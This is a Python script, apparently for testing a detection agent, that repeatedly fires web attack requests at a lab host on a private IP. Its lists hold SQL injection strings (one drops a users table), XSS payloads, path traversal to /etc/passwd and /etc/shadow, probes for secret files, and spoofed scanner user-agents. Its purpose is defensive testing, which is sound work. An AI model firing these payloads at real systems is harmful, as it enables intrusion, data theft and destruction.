#!/usr/bin/env python3
"""
Continuous Attack Generator for Sentinel Agent Testing
Generates attacks at regular intervals to test real-time detection

Usage:
    python continuous_attacks.py [--interval SECONDS] [--duration MINUTES]
"""

import requests
import time
import random
import sys
import argparse
from datetime import datetime, timedelta

# Configuration
TARGET = "http://192.168.31.91"

# Attack patterns
ATTACKS = {
    "SQL Injection": [
        "/?id=' OR '1'='1",
        "/?user=admin'--",
        "/?search=' UNION SELECT NULL--",
        "/login?user=admin' AND '1'='1",
        "/?id=1'; DROP TABLE users--",
    ],
    "XSS": [
        "/?q=<script>alert('XSS')</script>",
        "/?name=<img src=x onerror=alert(1)>",
        "/?msg=<svg/onload=alert('XSS')>",
        "/search?q=<iframe src=javascript:alert('XSS')>",
    ],
    "Path Traversal": [
        "/../../../etc/passwd",
        "/../../../../etc/shadow",
        "/..%2F..%2F..%2Fetc%2Fpasswd",
        "/../../../../../../../etc/hosts",
    ],
    "Directory Scanning": [
        "/admin",
        "/phpmyadmin",
        "/.git/config",
        "/wp-admin",
        "/.env",
        "/backup.sql",
        "/config.php",
        "/database.yml",
    ],
    "API Attacks": [
        "/api/users",
        "/api/admin",
        "/api/config",
        "/api/../../../etc/passwd",
    ],
}

SUSPICIOUS_AGENTS = [
    "sqlmap/1.0",
    "Nikto",
    "nmap NSE",
    "Acunetix",
]

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_status(text, color=Colors.CYAN):
    """Print status message with timestamp"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{color}[{timestamp}] {text}{Colors.ENDC}")

def launch_attack():
    """Launch a random attack"""
    attack_type = random.choice(list(ATTACKS.keys()))
    payload = random.choice(ATTACKS[attack_type])
    
    headers = {}
    if random.random() > 0.7:  # 30% chance of suspicious user-agent
        headers['User-Agent'] = random.choice(SUSPICIOUS_AGENTS)
    
    try:
        url = TARGET + payload
        response = requests.get(url, headers=headers, timeout=5)
        print_status(
            f"{attack_type:<20} → {payload:<40} [Status: {response.status_code}]",
            Colors.YELLOW
        )
        return True
    except requests.exceptions.ConnectionError:
        print_status("Connection failed! Is Apache running?", Colors.RED)
        return False
    except Exception as e:
        print_status(f"Error: {e}", Colors.RED)
        return False

def main():
    """Main execution"""
    parser = argparse.ArgumentParser(description="Continuous attack generator")
    parser.add_argument("--interval", type=int, default=10,
                       help="Seconds between attacks (default: 10)")
    parser.add_argument("--duration", type=int, default=60,
                       help="Total duration in minutes (default: 60)")
    parser.add_argument("--burst", type=int, default=1,
                       help="Number of attacks per interval (default: 1)")
    
    args = parser.parse_args()
    
    print(f"\n{Colors.HEADER}{Colors.BOLD}{'='*80}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}CONTINUOUS ATTACK GENERATOR{Colors.ENDC}".center(80))
    print(f"{Colors.HEADER}{Colors.BOLD}{'='*80}{Colors.ENDC}\n")
    
    print(f"{Colors.BOLD}Configuration:{Colors.ENDC}")
    print(f"  Target:     {TARGET}")
    print(f"  Interval:   {args.interval} seconds")
    print(f"  Duration:   {args.duration} minutes")
    print(f"  Burst size: {args.burst} attacks")
    print(f"\n{Colors.BOLD}Dashboard:{Colors.ENDC} http://192.168.31.91:8501")
    print(f"{Colors.BOLD}API:{Colors.ENDC}       http://192.168.31.91:8000/api/attacks\n")
    
    print_status("Testing connection...", Colors.CYAN)
    try:
        r = requests.get(TARGET, timeout=5)
        print_status(f"✓ Connected! Status: {r.status_code}", Colors.GREEN)
    except requests.exceptions.RequestException:
        print_status("✗ Cannot connect to target!", Colors.RED)
        sys.exit(1)
    
    print(f"\n{Colors.YELLOW}Starting attacks in 3 seconds...{Colors.ENDC}")
    time.sleep(3)
    
    start_time = datetime.now()
    end_time = start_time + timedelta(minutes=args.duration)
    attack_count = 0
    
    print(f"\n{Colors.GREEN}{'─'*80}{Colors.ENDC}")
    print_status("Attack generation started!", Colors.GREEN)
    print(f"{Colors.GREEN}{'─'*80}{Colors.ENDC}\n")
    
    try:
        while datetime.now() < end_time:
            # Launch burst of attacks
            for _ in range(args.burst):
                if launch_attack():
                    attack_count += 1
                else:
                    print_status("Connection issues, retrying...", Colors.YELLOW)
                    time.sleep(5)
                    break
                
                if args.burst > 1:
                    time.sleep(0.5)  # Small delay between burst attacks
            
            # Show stats every 10 attacks
            if attack_count % 10 == 0 and attack_count > 0:
                elapsed = (datetime.now() - start_time).total_seconds() / 60
                remaining = (end_time - datetime.now()).total_seconds() / 60
                print(f"\n{Colors.CYAN}{'─'*80}{Colors.ENDC}")
                print_status(
                    f"Stats: {attack_count} attacks | "
                    f"Elapsed: {elapsed:.1f}m | "
                    f"Remaining: {remaining:.1f}m",
                    Colors.CYAN
                )
                print(f"{Colors.CYAN}{'─'*80}{Colors.ENDC}\n")
            
            time.sleep(args.interval)
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Stopped by user{Colors.ENDC}")
    
    # Final summary
    elapsed = (datetime.now() - start_time).total_seconds() / 60
    print(f"\n{Colors.HEADER}{Colors.BOLD}{'='*80}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}ATTACK SUMMARY{Colors.ENDC}".center(80))
    print(f"{Colors.HEADER}{Colors.BOLD}{'='*80}{Colors.ENDC}\n")
    
    print(f"{Colors.BOLD}Total Attacks:{Colors.ENDC}  {attack_count}")
    print(f"{Colors.BOLD}Duration:{Colors.ENDC}       {elapsed:.1f} minutes")
    print(f"{Colors.BOLD}Rate:{Colors.ENDC}           {attack_count/max(elapsed, 0.1):.1f} attacks/min")
    
    print(f"\n{Colors.GREEN}{'─'*80}{Colors.ENDC}")
    print_status("Check dashboard for detected threats!", Colors.GREEN)
    print(f"{Colors.GREEN}{'─'*80}{Colors.ENDC}\n")

if __name__ == "__main__":
    main()
